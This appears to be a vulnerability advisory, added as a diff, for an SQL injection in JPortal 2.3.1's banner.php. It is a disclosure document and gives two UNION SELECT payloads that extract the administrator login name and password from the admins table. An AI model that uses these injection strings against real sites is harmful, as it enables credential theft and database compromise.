@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/13103/info
+
+JPortal is reportedly affected by an SQL injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.
+
+Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.
+
+This issue is reported to affect JPortal version 2.3.1; earlier versions may also be vulnerable. 
+
+The following demonstrates the steps necessary to obtain the administrator login id and password:
+go to http://www.example.com/jportal/banner.php and try this:
+
+' UNION SELECT NULL, nick, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
+NULL, NULL, NULL, NULL, NULL from admins where '1=1
+
+and then:
+
+' UNION SELECT NULL, pass, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
+NULL, NULL, NULL, NULL, NULL from admins where '1=1 
